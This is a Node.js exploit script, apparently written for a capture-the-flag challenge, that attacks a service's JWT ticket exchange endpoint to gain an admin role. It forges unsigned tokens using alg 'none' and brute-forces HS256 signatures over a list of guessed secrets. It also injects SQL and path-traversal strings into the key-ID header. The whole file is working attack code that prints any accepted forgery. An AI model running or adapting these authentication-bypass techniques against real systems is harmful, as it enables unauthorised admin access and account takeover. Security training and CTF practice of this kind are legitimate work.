import { createHmac, randomUUID } from "node:crypto";

const BASE = process.env.GHOST_BASE || "https://rsnfg2lzhxprnrolji5kuaicz3e.cloud.d3c.tf";

function b64(value) {
  return Buffer.from(typeof value === "string" ? value : JSON.stringify(value)).toString("base64url");
}

function hs256(header, payload, secret) {
  const head = b64(header);
  const body = b64(payload);
  const sig = createHmac("sha256", secret).update(`${head}.${body}`).digest("base64url");
  return `${head}.${body}.${sig}`;
}

function unsigned(header, payload) {
  return `${b64(header)}.${b64(payload)}.`;
}

const now = Math.floor(Date.now() / 1000);
const payloads = [
  {
    typ: "ticket",
    scope: "admin-bootstrap",
    sub: "ops-root",
    iss: "ghost-packet-auth",
    aud: "ghost-packet-ticket",
    iat: now,
    exp: now + 180,
  },
  {
    typ: "ticket",
    role: "admin",
    scope: "admin-bootstrap",
    sub: "ops-root",
    iss: "ghost-packet-auth",
    aud: "ghost-packet-ticket",
    iat: now,
    jti: randomUUID(),
    exp: now + 180,
  },
];

const secrets = [
  "",
  "secret",
  "admin",
  "ghost",
  "legacy",
  "legacy-bootstrap",
  "admin-bootstrap",
  "ghost-packet-auth",
  "ghost-packet-ticket",
  "legacy-rs256-retired",
  "expired-test-capture-signature",
  "d7DwnkgQl8hNpMy1Wj7eIKJkjMagLA/U",
  Buffer.from("d7DwnkgQl8hNpMy1Wj7eIKJkjMagLA/U", "base64"),
  "yv9M6Ukwt8mTa4RiRzpRhHaUitDveqJ+",
  Buffer.from("yv9M6Ukwt8mTa4RiRzpRhHaUitDveqJ+", "base64"),
];

const kids = [
  "legacy-rs256-retired",
  "primary-rs256",
  "admin",
  "ops-root",
  "legacy-rs256-retired' OR '1'='1'--",
  "../../dev/null",
  "/dev/null",
];

for (const payload of payloads) {
  for (const header of [
    { alg: "none", typ: "JWT", kid: "legacy-rs256-retired" },
    { alg: "none", typ: "JWT" },
  ]) {
    const ticket = unsigned(header, payload);
    const res = await fetch(`${BASE}/api/auth/exchange`, {
      method: "POST",
      headers: { Accept: "application/json", "Content-Type": "application/json" },
      body: JSON.stringify({ ticket, grantType: "legacy-bootstrap" }),
    });
    const text = await res.text();
    if (res.status !== 401) console.log(JSON.stringify({ kind: "none", header, payload, status: res.status, text }));
  }

  for (const kid of kids) {
    for (const secret of secrets) {
      const ticket = hs256({ alg: "HS256", typ: "JWT", kid }, payload, secret);
      const res = await fetch(`${BASE}/api/auth/exchange`, {
        method: "POST",
        headers: { Accept: "application/json", "Content-Type": "application/json" },
        body: JSON.stringify({ ticket, grantType: "legacy-bootstrap" }),
      });
      const text = await res.text();
      if (res.status !== 401) {
        console.log(JSON.stringify({
          kind: "hs256",
          kid,
          secret: Buffer.isBuffer(secret) ? `raw:${secret.toString("hex")}` : String(secret),
          payload,
          status: res.status,
          text,
        }));
      }
    }
  }
}
